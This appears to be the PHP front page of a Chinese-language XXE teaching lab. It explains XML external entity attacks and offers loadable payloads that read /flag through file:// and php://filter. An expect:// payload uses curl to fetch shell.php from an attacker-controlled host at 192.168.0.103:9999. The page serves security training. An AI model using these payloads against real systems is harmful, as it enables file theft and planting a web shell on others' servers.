<?php
$hasExpect = extension_loaded('expect');
$payloads = [
    'file' =>
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        . "<!DOCTYPE data [\n"
        . "<!ENTITY xxe SYSTEM \"file:///flag\">\n"
        . "]>\n"
        . "<data>&xxe;</data>",
    'filter' =>
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        . "<!DOCTYPE data [\n"
        . "<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\">\n"
        . "]>\n"
        . "<data>&xxe;</data>",
    // root + email 结构；expect 需 PECL expect，镜像见 Dockerfile.with-expect
    'expect_curl' =>
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n"
        . "<!DOCTYPE root [\n"
        . "<!ENTITY xxe SYSTEM \"expect://curl\$IFS-O\$IFS'http://192.168.0.103:9999/shell.php'\">\n"
        . "]>\n"
        . "<root>\n"
        . "    <name></name>\n"
        . "    <email>&xxe;</email>\n"
        . "</root>",
];
?>
<!doctype html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>XXE 漏洞演示</title>
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; font-family: Arial, sans-serif; background: #f4f5f7; color: #1f2937; }
        .wrap { max-width: 1180px; margin: 20px auto; padding: 0 16px; }
        .card { background: #fff; border-radius: 10px; padding: 18px 20px; box-shadow: 0 4px 12px rgba(0,0,0,.08); margin-bottom: 14px; }
        .card.compact { padding: 14px 18px; }
        h1, h2, h3 { margin: 0 0 8px; font-weight: 600; }
        p { margin: 6px 0; line-height: 1.55; font-size: 14px; }
        .muted { color: #6b7280; font-size: 13px; }
        .split { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; align-items: start; }
        @media (max-width: 920px) {
            .split { grid-template-columns: 1fr; }
            .submit-panel { position: static !important; }
        }
        .left-col .card:last-child { margin-bottom: 0; }
        .submit-panel {
            position: sticky;
            top: 16px;
        }
        .submit-panel textarea {
            width: 100%;
            min-height: 420px;
            padding: 10px;
            border: 1px solid #d1d5db;
            border-radius: 8px;
            font-family: Consolas, monospace;
            font-size: 13px;
            line-height: 1.45;
            resize: vertical;
        }
        button, .btn { display: inline-block; padding: 7px 12px; margin: 4px 8px 0 0; border: none; border-radius: 8px; background: #2563eb; color: #fff; cursor: pointer; text-decoration: none; font-size: 13px; }
        .btn.gray { background: #6b7280; }
        .btn-row { margin-top: 8px; }
        code { background: #eef2ff; padding: 2px 6px; border-radius: 6px; font-size: 13px; }
        ul { margin: 6px 0 6px 1.1em; font-size: 14px; line-height: 1.5; }
        .warn { background: #fef3c7; border: 1px solid #fcd34d; color: #92400e; padding: 8px 10px; border-radius: 8px; margin: 8px 0; font-size: 13px; }
        .ok { background: #d1fae5; border: 1px solid #6ee7b7; color: #065f46; padding: 8px 10px; border-radius: 8px; margin: 8px 0; font-size: 13px; }
        pre.inline { background: #111827; color: #e5e7eb; padding: 10px 12px; border-radius: 8px; overflow: auto; font-size: 12px; margin: 8px 0; }
        .submit-panel h2 { margin-bottom: 10px; }
        .submit-panel .actions { margin-top: 12px; }
        .submit-panel button[type="submit"] { padding: 10px 20px; font-size: 15px; }
    </style>
</head>
<body>
<div class="wrap">
    <div class="card compact">
        <h1>XXE（XML 外部实体）演示靶场</h1>
        <p class="muted">后端 <code>/xxe.php</code> 使用 <code>DOMDocument::loadXML</code> + <code>LIBXML_NOENT</code> / <code>LIBXML_DTDLOAD</code>，并显式允许外部实体。</p>
        <p><strong>PECL expect：</strong>
            <?php if ($hasExpect): ?>
                <span class="ok" style="display:inline;padding:4px 10px;">已加载，可测 <code>expect://</code></span>
            <?php else: ?>
                <span class="warn" style="display:inline;padding:4px 10px;">未加载 — <code>file://</code> / <code>php://filter</code> 可用；<code>expect://</code> 需用 <code>Dockerfile.with-expect</code> 构建镜像</span>
            <?php endif; ?>
        </p>
    </div>

    <div class="split">
        <div class="left-col">
            <div class="card">
                <h2>原理简述</h2>
                <p>DTD 中可声明<strong>外部实体</strong>（<code>SYSTEM "..."</code>）。解析选项若允许加载并展开实体（如 <code>LIBXML_NOENT</code>），可能带来<strong>本地文件读取</strong>、<strong>SSRF</strong>；若启用 PECL <strong>expect</strong>，还可能通过 <code>expect://</code> 执行命令。</p>
                <p class="muted">参数实体、盲 XXE、OOB 带外回显 —— 可以结合 Burp、DNS 日志继续扩展。</p>
            </div>

            <div class="card">
                <h2>典型场景</h2>
                <ul>
                    <li>上传/提交 XML、SOAP、配置导入等。</li>
                    <li>使用 libxml 系解析且未禁用外部实体，或解析标志不当。</li>
                    <li>回显解析结果或存在带外通道时，易泄露或被利用。</li>
                </ul>
            </div>

            <div class="card">
                <h2><code>file://</code> 读文件</h2>
                <p>实体指向本地路径，本靶场 FLAG 在 <code>/flag</code>：</p>
                <pre class="inline">&lt;!ENTITY xxe SYSTEM "file:///flag"&gt;</pre>
                <p>元素内使用 <code>&amp;xxe;</code> 引用。</p>
                <div class="btn-row"><button type="button" class="btn gray" onclick="loadPayload('file')">载入 file 模板</button></div>
            </div>

            <div class="card">
                <h2><code>php://filter</code></h2>
                <p>通过封装器做读取与转换，例如 Base64 编码后再进入文档，便于绕过部分过滤或二次解码。</p>
                <pre class="inline">php://filter/read=convert.base64-encode/resource=/flag</pre>
                <p class="muted">是否可用取决于 PHP 封装器与实体解析的组合；本环境用于演示。</p>
                <div class="btn-row"><button type="button" class="btn gray" onclick="loadPayload('filter')">载入 php://filter 模板</button></div>
            </div>

            <div class="card">
                <h2><code>expect://</code> 命令链</h2>
                <p>启用 PECL <strong>expect</strong> 时存在 <code>expect://</code> 封装器（高风险，仅授权环境）。</p>
                <p>示例：用 <code>curl</code> 从你控制的 HTTP 拉取文件。在 <code>attacker-demo/</code> 目录启动：</p>
                <pre class="inline">python3 -m http.server 9999</pre>
                <p>将下面 XML 中的 IP、端口改为你的机器；<code>shell.php</code> 见 <code>attacker-demo/shell.php</code>。</p>
                <p class="warn"><strong>说明：</strong>下列 payload 使用 <code>$IFS</code> 代替空格；<code>curl -O</code> 保存位置与 PHP 进程工作目录有关。</p>
                <div class="btn-row"><button type="button" class="btn gray" onclick="loadPayload('expect_curl')">载入 expect + curl 模板</button></div>
                <?php if (!$hasExpect): ?>
                    <p class="warn">当前镜像未加载 expect，解析可能失败。构建：<code>docker build -f Dockerfile.with-expect -t xxe-lab-expect .</code></p>
                <?php endif; ?>
            </div>
        </div>

        <div class="right-col">
            <div class="card submit-panel">
                <h2>提交 XML</h2>
                <p class="muted">POST 到 <code>/xxe.php</code>，字段名 <code>xml</code>。也可用 curl 发送 <code>Content-Type: application/xml</code> 的原始体。</p>
                <form method="post" action="/xxe.php">
                    <textarea name="xml" id="xmlField" placeholder="左侧点「载入…模板」或自行粘贴"><?php
echo htmlspecialchars($payloads['file'], ENT_QUOTES, 'UTF-8');
?></textarea>
                    <div class="actions">
                        <button type="submit">解析 XML</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>
<script>
var PAYLOADS = <?php echo json_encode($payloads, JSON_UNESCAPED_SLASHES | JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_AMP | JSON_HEX_QUOT); ?>;
function loadPayload(key) {
    var el = document.getElementById('xmlField');
    if (!el || !PAYLOADS[key]) return;
    el.value = PAYLOADS[key];
    el.focus();
}
</script>
</body>
</html>
